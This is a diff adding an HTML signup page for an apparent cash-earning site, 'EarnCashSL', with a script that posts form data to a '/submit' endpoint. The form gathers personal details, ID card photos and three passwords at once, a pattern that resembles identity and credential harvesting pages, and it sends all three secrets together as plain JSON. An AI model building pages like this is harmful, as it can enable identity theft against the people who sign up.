@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>EarnCashSL - Signup</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; background: #f4f4f9; }
+        .form-container { max-width: 500px; margin: auto; background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        h2 { color: #2c3e50; text-align: center; }
+        .input-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; }
+        input, select, textarea { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        .social-link-item { display: flex; gap: 10px; margin-bottom: 10px; }
+        .add-btn { background: #27ae60; color: white; border: none; padding: 5px 15px; cursor: pointer; border-radius: 5px; margin-bottom: 15px; }
+        .submit-btn { width: 100%; background: #2980b9; color: white; padding: 12px; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<div class="form-container">
+    <h2>Join EarnCashSL</h2>
+    <form id="signupForm">
+        <!-- Basic Info -->
+        <div class="input-group">
+            <label>Full Name</label>
+            <input type="text" id="fullname" required>
+        </div>
+        <div class="input-group">
+            <label>Phone No.</label>
+            <input type="tel" id="phone" required>
+        </div>
+        <div class="input-group">
+            <label>Address</label>
+            <textarea id="address" rows="2" required></textarea>
+        </div>
+        <div class="input-group">
+            <label>Date of Birth</label>
+            <input type="date" id="dob" required>
+        </div>
+
+        <!-- Social Media Links with Plus Icon -->
+        <label>Social Media Links</label>
+        <div id="socialLinksContainer">
+            <div class="social-link-item">
+                <input type="url" name="socialLink[]" placeholder="https://..." required>
+            </div>
+        </div>
+        <button type="button" class="add-btn" onclick="addSocialLink()">+ Add Another Link</button>
+
+        <!-- ID Uploads -->
+        <div class="input-group">
+            <label>ID Copy (Front Side)</label>
+            <input type="file" id="idFront" accept="image/*" required>
+        </div>
+        <div class="input-group">
+            <label>ID Copy (Back Side)</label>
+            <input type="file" id="idBack" accept="image/*" required>
+        </div>
+
+        <!-- Triple Password System -->
+        <div class="input-group">
+            <label>Login Password (Password 1)</label>
+            <input type="password" id="pw1" required>
+        </div>
+        <div class="input-group">
+            <label>Transaction PIN (Password 2)</label>
+            <input type="password" id="pw2" required>
+        </div>
+        <div class="input-group">
+            <label>Security Recovery Code (Password 3)</label>
+            <input type="password" id="pw3" required>
+        </div>
+
+        <button type="submit" class="submit-btn">Register & Start Earning</button>
+    </form>
+</div>
+
+<script>
+    // Add new social link field
+    function addSocialLink() {
+        const container = document.getElementById('socialLinksContainer');
+        const div = document.createElement('div');
+        div.className = 'social-link-item';
+        div.innerHTML = `<input type="url" name="socialLink[]" placeholder="https://...">`;
+        container.appendChild(div);
+    }
+
+    // Handle Form Submission to Cloudflare Worker
+    document.getElementById('signupForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        // In a real setup, you would convert images to Base64 or use FormData
+        const formData = {
+            name: document.getElementById('fullname').value,
+            phone: document.getElementById('phone').value,
+            socials: Array.from(document.getElementsByName('socialLink[]')).map(i => i.value),
+            passwords: [
+                document.getElementById('pw1').value,
+                document.getElementById('pw2').value,
+                document.getElementById('pw3').value
+            ]
+        };
+
+        const response = await fetch('/submit', { // This calls your Cloudflare Function
+            method: 'POST',
+            body: JSON.stringify(formData)
+        });
+
+        if (response.ok) alert('Registration successful! Waiting for ID verification.');
+    });
+</script>
+
+</body>
+</html>
